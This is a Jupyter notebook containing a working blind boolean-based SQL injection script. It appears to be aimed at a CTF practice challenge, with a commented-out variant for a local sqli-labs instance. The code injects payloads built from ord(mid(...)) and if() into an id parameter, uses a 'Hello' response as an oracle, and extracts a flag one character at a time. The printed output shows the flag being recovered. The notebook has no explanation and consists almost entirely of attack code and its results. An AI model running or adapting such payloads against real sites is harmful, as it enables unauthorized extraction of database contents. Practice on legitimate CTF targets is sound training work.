{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "f\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "fl\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "fla\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flag\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u_\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u_@\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u_@r\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u_@r3\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u_@r3_\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u_@r3_5\n",
      ". . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u_@r3_5O\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u_@r3_5O_\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u_@r3_5O_d\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u_@r3_5O_dA\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u_@r3_5O_dAm\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u_@r3_5O_dAmn\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u_@r3_5O_dAmn_\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u_@r3_5O_dAmn_9\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u_@r3_5O_dAmn_90\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u_@r3_5O_dAmn_90O\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . \n",
      "flagY0u_@r3_5O_dAmn_90Od\n",
      ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . "
     ]
    }
   ],
   "source": [
    "import urllib\n",
    "import urllib.request\n",
    "import re\n",
    "import time \n",
    "opener = urllib.request.build_opener()\n",
    "result =''\n",
    "payloads = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@_.}{'\n",
    "#payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'\n",
    "user = \"\"\n",
    "for i in range(1,30):\n",
    "    for p in payloads:\n",
    "        s1 = \"%s\" %(i)\n",
    "        s2 = \"%s\" %(ord(p))\n",
    "        #s = \"http://10.1.1.111//sqli-labs/Less-5/?id=1%27and%20if(ord(mid(user(),\"+s1+\",1))=\"+s2+\",1,0)--+\"\n",
    "        #s = \"http://ctf5.shiyanbar.com/web/index_3.php?id=1'/**/and/**/if(ord(mid(database(),\"+s1+\",1))=\"+s2+\",1,0)/**/and/**/'1'='1\"\n",
    "        s = \"http://ctf5.shiyanbar.com/web/index_3.php?id=1'/**/and/**/if((select/**/ord(mid(flag,\"+s1+\",1))/**/from/**/flag)=\"+s2+\",1,0)/**/and/**/'1'='1\"\n",
    "        #print(s)\n",
    "        try:\n",
    "            starttime = time.time()\n",
    "            req = urllib.request.Request(s)\n",
    "            req_data=opener.open(req,timeout=20)\n",
    "            html = req_data.read().decode(encoding='UTF-8',errors='ignore')\n",
    "            #print(html)\n",
    "            if re.findall('Hello',html): \n",
    "                result = result + p\n",
    "                print('\\n'+result)\n",
    "            else:\n",
    "                print('.',end=' ')\n",
    "        except urllib.error.URLError as ex:\n",
    "            break "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "import urllib\n",
    "import urllib.error"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ord('f')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'v'"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "chr(118)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
